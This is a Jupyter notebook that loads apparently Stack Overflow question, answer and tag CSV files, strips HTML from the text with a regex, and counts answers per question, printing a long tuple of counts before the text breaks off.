{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Put these at the top of every notebook, to get automatic reloading and inline plotting\n",
    "%reload_ext autoreload\n",
    "%autoreload 2\n",
    "%matplotlib inline"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import collections\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "import matplotlib.cm as cm\n",
    "%matplotlib inline\n",
    "import math"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def cleanhtml(raw_html):\n",
    "  cleanr = re.compile('<.*?>')\n",
    "  cleantext = re.sub(cleanr, '', raw_html)\n",
    "  return cleantext"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "questions = pd.read_csv(\"Questions.csv\", encoding='latin1')\n",
    "answers = pd.read_csv(\"Answers.csv\", encoding='latin1')\n",
    "tags = pd.read_csv(\"Tags.csv\", encoding='latin1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "# count=0\n",
    "# for text in answers['Body']:\n",
    "#     answers['Body'][count].replace(cleanhtml(text))\n",
    "cleanr = re.compile('<.*?>')\n",
    "answers['Body'].replace(cleanr,'',inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "questions['Body'].replace(cleanr,'',inplace=True)\n",
    "questions['Title'].replace(cleanr,'',inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# cleanr = re.compile('[^\\w ]+')\n",
    "# answers['Body'].replace(cleanr,'',inplace=True)\n",
    "# questions['Body'].replace(cleanr,'',inplace=True)\n",
    "# questions['Title'].replace(cleanr,'',inplace=True)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Id</th>\n",
       "      <th>OwnerUserId</th>\n",
       "      <th>CreationDate</th>\n",
       "      <th>ParentId</th>\n",
       "      <th>Score</th>\n",
       "      <th>Body</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>92</td>\n",
       "      <td>61.0</td>\n",
       "      <td>2008-08-01T14:45:37Z</td>\n",
       "      <td>90</td>\n",
       "      <td>13</td>\n",
       "      <td>Version Control with Subversion\\r\\n\\r\\nA very ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>124</td>\n",
       "      <td>26.0</td>\n",
       "      <td>2008-08-01T16:09:47Z</td>\n",
       "      <td>80</td>\n",
       "      <td>12</td>\n",
       "      <td>I wound up using this. It is a kind of a hack,...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>199</td>\n",
       "      <td>50.0</td>\n",
       "      <td>2008-08-01T19:36:46Z</td>\n",
       "      <td>180</td>\n",
       "      <td>1</td>\n",
       "      <td>I've read somewhere the human eye can't distin...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>269</td>\n",
       "      <td>91.0</td>\n",
       "      <td>2008-08-01T23:49:57Z</td>\n",
       "      <td>260</td>\n",
       "      <td>4</td>\n",
       "      <td>Yes, I thought about that, but I soon figured ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>307</td>\n",
       "      <td>49.0</td>\n",
       "      <td>2008-08-02T01:49:46Z</td>\n",
       "      <td>260</td>\n",
       "      <td>28</td>\n",
       "      <td>Oleg Shilo's C# Script solution (at The Code P...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Id  OwnerUserId          CreationDate  ParentId  Score  \\\n",
       "0   92         61.0  2008-08-01T14:45:37Z        90     13   \n",
       "1  124         26.0  2008-08-01T16:09:47Z        80     12   \n",
       "2  199         50.0  2008-08-01T19:36:46Z       180      1   \n",
       "3  269         91.0  2008-08-01T23:49:57Z       260      4   \n",
       "4  307         49.0  2008-08-02T01:49:46Z       260     28   \n",
       "\n",
       "                                                Body  \n",
       "0  Version Control with Subversion\\r\\n\\r\\nA very ...  \n",
       "1  I wound up using this. It is a kind of a hack,...  \n",
       "2  I've read somewhere the human eye can't distin...  \n",
       "3  Yes, I thought about that, but I soon figured ...  \n",
       "4  Oleg Shilo's C# Script solution (at The Code P...  "
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "answers.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Id</th>\n",
       "      <th>OwnerUserId</th>\n",
       "      <th>CreationDate</th>\n",
       "      <th>ClosedDate</th>\n",
       "      <th>Score</th>\n",
       "      <th>Title</th>\n",
       "      <th>Body</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>80</td>\n",
       "      <td>26.0</td>\n",
       "      <td>2008-08-01T13:57:07Z</td>\n",
       "      <td>NaN</td>\n",
       "      <td>26</td>\n",
       "      <td>SQLStatement.execute() - multiple queries in o...</td>\n",
       "      <td>I've written a database generation script in S...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>90</td>\n",
       "      <td>58.0</td>\n",
       "      <td>2008-08-01T14:41:24Z</td>\n",
       "      <td>2012-12-26T03:45:49Z</td>\n",
       "      <td>144</td>\n",
       "      <td>Good branching and merging tutorials for Torto...</td>\n",
       "      <td>Are there any really good tutorials explaining...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>120</td>\n",
       "      <td>83.0</td>\n",
       "      <td>2008-08-01T15:50:08Z</td>\n",
       "      <td>NaN</td>\n",
       "      <td>21</td>\n",
       "      <td>ASP.NET Site Maps</td>\n",
       "      <td>Has anyone got experience creating SQL-based A...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>180</td>\n",
       "      <td>2089740.0</td>\n",
       "      <td>2008-08-01T18:42:19Z</td>\n",
       "      <td>NaN</td>\n",
       "      <td>53</td>\n",
       "      <td>Function for creating color wheels</td>\n",
       "      <td>This is something I've pseudo-solved many time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>260</td>\n",
       "      <td>91.0</td>\n",
       "      <td>2008-08-01T23:22:08Z</td>\n",
       "      <td>NaN</td>\n",
       "      <td>49</td>\n",
       "      <td>Adding scripting functionality to .NET applica...</td>\n",
       "      <td>I have a little game written in C#. It uses a ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Id  OwnerUserId          CreationDate            ClosedDate  Score  \\\n",
       "0   80         26.0  2008-08-01T13:57:07Z                   NaN     26   \n",
       "1   90         58.0  2008-08-01T14:41:24Z  2012-12-26T03:45:49Z    144   \n",
       "2  120         83.0  2008-08-01T15:50:08Z                   NaN     21   \n",
       "3  180    2089740.0  2008-08-01T18:42:19Z                   NaN     53   \n",
       "4  260         91.0  2008-08-01T23:22:08Z                   NaN     49   \n",
       "\n",
       "                                               Title  \\\n",
       "0  SQLStatement.execute() - multiple queries in o...   \n",
       "1  Good branching and merging tutorials for Torto...   \n",
       "2                                  ASP.NET Site Maps   \n",
       "3                 Function for creating color wheels   \n",
       "4  Adding scripting functionality to .NET applica...   \n",
       "\n",
       "                                                Body  \n",
       "0  I've written a database generation script in S...  \n",
       "1  Are there any really good tutorials explaining...  \n",
       "2  Has anyone got experience creating SQL-based A...  \n",
       "3  This is something I've pseudo-solved many time...  \n",
       "4  I have a little game written in C#. It uses a ...  "
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "questions.head()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "answers['Body'][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/root/anaconda3/lib/python3.6/site-packages/ipykernel_launcher.py:3: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: http://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy\n",
      "  This is separate from the ipykernel package so we can avoid doing imports until\n"
     ]
    }
   ],
   "source": [
    "x=0\n",
    "for c in answers['Body']:\n",
    "    answers['Body'][x]=cleanhtml(c)\n",
    "    x=x+1\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "answers.info()\n",
    "questions.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'collections.Counter'>\n"
     ]
    }
   ],
   "source": [
    "ans_per_question = collections.Counter(answers['ParentId'])\n",
    "print(type(ans_per_question))\n",
    "answerid,noAnswers= zip(*ans_per_question.most_common())\n",
    "text = \"Avegrage number of answers per question \",np.mean(noAnswers)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(408,\n",
       " 316,\n",
       " 129,\n",
       " 100,\n",
       " 69,\n",
       " 67,\n",
       " 61,\n",
       " 59,\n",
       " 55,\n",
       " 51,\n",
       " 50,\n",
       " 49,\n",
       " 45,\n",
       " 43,\n",
       " 43,\n",
       " 42,\n",
       " 41,\n",
       " 40,\n",
       " 40,\n",
       " 40,\n",
       " 39,\n",
       " 39,\n",
       " 38,\n",
       " 38,\n",
       " 38,\n",
       " 37,\n",
       " 36,\n",
       " 36,\n",
       " 36,\n",
       " 35,\n",
       " 35,\n",
       " 34,\n",
       " 34,\n",
       " 34,\n",
       " 34,\n",
       " 34,\n",
       " 33,\n",
       " 33,\n",
       " 33,\n",
       " 33,\n",
       " 33,\n",
       " 32,\n",
       " 32,\n",
       " 32,\n",
       " 32,\n",
       " 32,\n",
       " 32,\n",
       " 32,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 31,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 30,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 29,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 28,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 27,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 26,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 25,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 24,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 23,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 22,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 21,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 20,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 19,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 18,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 17,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 16,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 15,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " 14,\n",
       " ...)"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "noAnswers\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
